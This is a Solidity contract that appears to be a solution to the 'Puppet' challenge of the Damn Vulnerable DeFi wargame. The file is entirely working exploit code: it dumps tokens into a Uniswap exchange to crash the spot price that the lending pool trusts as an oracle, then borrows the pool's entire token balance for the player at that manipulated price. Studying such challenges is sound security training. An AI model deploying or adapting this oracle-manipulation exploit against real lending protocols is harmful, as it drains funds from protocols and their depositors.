// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./PuppetPool.sol";
import "./IUniswapExchange.sol";
import "hardhat/console.sol";

/**
 * @title PuppetPoolAttacker
 * @author Igor Coser (https://damnvulnerabledefi.xyz)
 */


 contract PuppetPoolAttacker{
    IUniswapExchange public immutable uniswapExchange;
    DamnValuableToken public immutable token;
    PuppetPool public immutable pool;
    address public immutable player;

    constructor(address tokenAddress, address uniswapExchangeAddress, address poolAddress, address playerAddress) payable{
        token = DamnValuableToken(tokenAddress);
        uniswapExchange = IUniswapExchange(uniswapExchangeAddress);
        pool = PuppetPool(poolAddress);
        player = playerAddress;
    }

    function attack() external{
        uint256 balance = token.balanceOf(address(this));
        uint256 ethOutput = uniswapExchange.getTokenToEthInputPrice(balance);

        token.approve(address(uniswapExchange), balance);

        uniswapExchange.tokenToEthSwapInput(balance, ethOutput, block.timestamp * 2);

        pool.borrow{value: address(this).balance}(token.balanceOf(address(pool)), player);
    }

    receive() external payable {}
}
